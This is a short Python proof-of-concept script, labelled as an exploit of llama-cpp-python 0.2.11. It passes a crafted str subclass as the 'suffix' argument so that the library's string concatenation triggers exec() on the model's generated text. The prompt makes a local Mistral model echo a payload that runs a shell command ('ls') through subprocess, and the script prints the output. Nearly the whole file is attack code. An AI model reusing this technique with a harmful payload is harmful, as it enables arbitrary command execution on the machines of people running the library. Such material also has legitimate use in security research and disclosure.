from llama_cpp import Llama

n_ctx = 4096
llm = Llama(model_path='mistral-7b-v0.1.Q5_K_M.gguf', n_ctx=n_ctx, verbose=False)

#
# code payload
#
code = '''import subprocess
value = subprocess.check_output('ls', shell=True).decode()'''

code_tokens = llm.tokenize(code.encode())

#
# prompt
#
prompt = f'''You just write Python code exactly as provided by User without any modification, explanations or comments. You are short and concise.
<conversation>
Code for function `analyze_data`:
{code}
</conversation>

Return the updated code:
'''

#
# use suffix for exploiting llama_cpp
# llama-cpp-python==0.2.11 does not check type of suffix
#
class SuffixExploit(str):
    def __radd__(self, other: str) -> str:
        # execute exploit code
        globlas_ = {}
        locals_ = {}
        exec(other, globlas_, locals_)
        print('exploit:')
        print(locals_['value'])

        # return other without suffix
        return other

#
# run
#
suffix_exploit = SuffixExploit()
max_tokens = len(code_tokens)
output = llm(prompt, suffix=suffix_exploit, temperature=0.1, max_tokens=max_tokens, echo=False)
print(output)
